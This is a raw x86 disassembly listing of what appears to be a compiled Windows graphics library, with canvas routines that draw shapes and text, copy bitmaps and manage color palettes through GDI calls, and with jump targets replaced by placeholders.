retn 0x8
sub_44da1a
add [ eax ] al
or eax 0xe8000000
and eax [ 0xffffffff8bc30000 ]
rcl [ ebp - 0x75 ] 0xec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call RoundRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_44da75
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ sub_44dab0 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
sub_44dab0
sldt [ eax ]
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x18 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_44df24
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_44dae0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_44dbb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
cmp al 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44cfbc
inc eax
add [ ebp - 0x4 ] eax
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
push esi
mov eax [ ebp + 0x8 ]
call sub_407134
push eax
push 0x0
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call ExtTextOutW
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44cfbc
mov edx eax
add edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x5c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dbbc
lea eax [ ebp + 0x8 ]
call j_sub_4068a0
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_406a50
sub_44dbc5
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffec
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_44dca5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edi [ ebx + 0x18 ]
or edi 0x4
mov eax [ ebx + 0x48 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x1c ] 0x1
je r-xdata
test [ ebx + 0x18 ] 0x80
je r-xdata
or edi 0x2
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
cmp al 0x1
jne r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_44cfbc
inc eax
add [ ebp - 0x4 ] eax
push 0x0
push esi
mov eax [ ebp + 0x8 ]
call sub_407134
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call ExtTextOutW
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dcac
lea eax [ ebp + 0x8 ]
call j_sub_4068a0
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_406a50
sub_44dcb9
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xc ] eax
xor edx edx
mov esi rw-data
jae r-xdata
and eax 0x7f
bt edi eax
inc edx
add esi 0x4
cmp dl 0x12
jne r-xdata
mov eax [ esi ]
or [ ebp - 0xc ] eax
mov eax edx
cmp al 0x1f
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_44df24
mov [ ebp - 0x10 ] eax
mov eax [ ebx ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov eax [ ebx ]
call sub_407134
push eax
mov eax [ ebp - 0x10 ]
push eax
call DrawTextExW
test edi 0x200
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ ebx ]
mov eax ebx
call sub_406a50
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx ]
call sub_407134
call sub_412550
mov edx eax
mov eax ebx
call sub_40740c
sub_44dd6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_44de04
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx [ r-xdata ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ esi + 0x38 ]
push eax
call GetTextExtentPoint32W
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44de0b
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_44de40
push ebx
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push esi
mov eax [ ebx + 0x38 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_44de65
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44de88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_44deb1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0x8 ]
call sub_44bb2c
push eax
push edi
push esi
mov eax [ ebx + 0x38 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44def7
add [ 0x53000000 ] al
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
push esi
mov eax [ ebx + 0x38 ]
push eax
call GetClipBox
pop esi
pop ebx
retn
sub_44df48
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x38 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x3c ]
movzx edx [ ebx + 0x3c ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x3c ]
mov [ ebx + 0x3c ] al
sub_44dfac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_44df48
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ esp ]
mov [ ebx + 0x4c ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x50 ] eax
xor eax eax
mov [ ebx + 0x38 ] eax
and [ ebx + 0x3c ] 0xfe
or [ ebx + 0x3c ] 0x1
mov [ ebx + 0x38 ] esi
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_44e000
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx ebx [ esi + 0x3c ]
not ebx
and bl [ esp ]
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x94 ]
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_44e07c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
test bl 0x8
je r-xdata
mov eax esi
call sub_44e0a8
or bl [ esi + 0x3c ]
mov [ esi + 0x3c ] bl
mov eax esi
call sub_44e0d8
sub_44e07c
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
call sub_44c204
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
mov eax [ ebx + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetTextColor
pop ebx
retn
sub_44e0a8
push ebx
mov ebx eax
mov eax [ ebx + 0x44 ]
call sub_44c978
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
mov eax [ ebx + 0x44 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetROP2
pop ebx
retn
sub_44e0d8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_44cd7c
push eax
call UnrealizeObject
mov eax [ ebx + 0x48 ]
call sub_44cd7c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SelectObject
mov eax [ ebx + 0x48 ]
mov esi [ eax + 0x10 ]
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44bb2c
not eax
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x38 ]
push eax
call SetBkMode
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebx + 0x38 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x38 ]
push eax
call SetBkMode
pop esi
pop ebx
retn
sub_44e1f4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_44e23e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e245
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_44e248
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
xor eax eax
mov [ ebp - 0x204 ] eax
xor eax eax
push ebp
push sub_44e2e4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_44e1f4
push 0x0
push 0x100
lea eax [ ebp - 0x200 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageW
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
lea edx [ ebp - 0x200 ]
mov ecx 0x100
call sub_407290
mov ecx [ ebp - 0x204 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e2eb
lea eax [ ebp - 0x204 ]
call j_sub_4068a0
retn
sub_44e300
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44e44e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectW
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_44e3bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_44e248
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_44e248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e455
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_44e460
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_44e480
push ebx
dec ecx
mov ebx eax
imul ebx edx
add ebx ecx
not ecx
and ebx ecx
mov ecx 0x8
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov eax ebx
pop ebx
retn
sub_44e4a0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44e715
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_44e2f0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e71c
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_44e2f0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44e568
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xccaa0029
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e71c
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_44e72c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
movzx ebx [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
movzx ebx [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
movzx ecx [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_44e768
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_404c14
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
movzx ebx [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
movzx eax [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_44e7e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x2
jle r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_44e838
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4043c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e935
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e93c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_44e950
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_44e9d6
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_44e9e8
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
add ecx ecx
add ecx ecx
call sub_4043c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_44e7e4
mov eax esp
call sub_44e950
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_44ea8c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectW
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax edi
inc eax
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_44e7e4
mov [ esp ] eax
sub_44eae0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_44e480
mov edx [ ebp - 0x8 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0xe ]
call sub_44e460
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44ec8d
push [ fs : edx ]
